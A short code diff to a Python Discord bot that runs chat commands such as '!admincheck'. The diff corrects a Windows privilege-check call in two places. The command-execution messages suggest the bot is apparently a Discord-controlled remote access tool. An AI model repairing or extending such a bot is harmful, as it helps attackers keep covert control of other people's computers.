@@ -346,7 +346,7 @@ async def on_message(message):
                 await message.channel.send(f'[*] Command successfully executed : {link}')
 
         if message.content == "!admincheck":
-            is_admin = ctypes.windll.shell32.IsUserAdmin() != 0
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 
             if is_admin == True:
                 await message.channel.send('[*] You are admin')
@@ -380,7 +380,7 @@ async def on_message(message):
 
                 def is_running_as_admin():
                     try:
-                        return ctypes.windll.shell32.IsUserAdmin()
+                        return ctypes.windll.shell32.IsUserAnAdmin()
                     except:
                         return False
                 
